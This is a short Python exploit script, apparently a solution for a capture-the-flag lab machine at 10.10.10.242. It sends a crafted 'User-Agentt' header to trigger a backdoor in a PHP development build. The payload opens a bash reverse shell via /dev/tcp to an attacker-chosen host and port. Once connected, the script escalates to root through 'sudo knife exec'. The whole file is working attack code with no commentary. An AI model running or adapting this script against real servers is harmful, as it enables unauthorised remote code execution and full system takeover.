#!/usr/bin/python3

import requests
from pwn import *

def ctrl_c(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

lhost=str(input("LHOST: ").strip("\n"))
lport=str(input("LPORT: ").strip("\n"))
payload=('zerodiumsystem("/bin/bash -c \' bash -i >& /dev/tcp/%s/%s 0>&1\'");') % (lhost, lport)

def foothold():
	url = 'http://10.10.10.242/'
	headers = {'user-agentt': payload}
	requests.get(url, headers=headers)
try:
    threading.Thread(target=foothold, args=()).start()
except Exception as e:
    log.error(str(e))
shell = listen(lport, timeout=150).wait_for_connection()
if shell.sock is None:
    sys.exit(1)
else:
    shell.sendline(b'sudo knife exec -E \'exec "/bin/sh"\'')
    shell.interactive()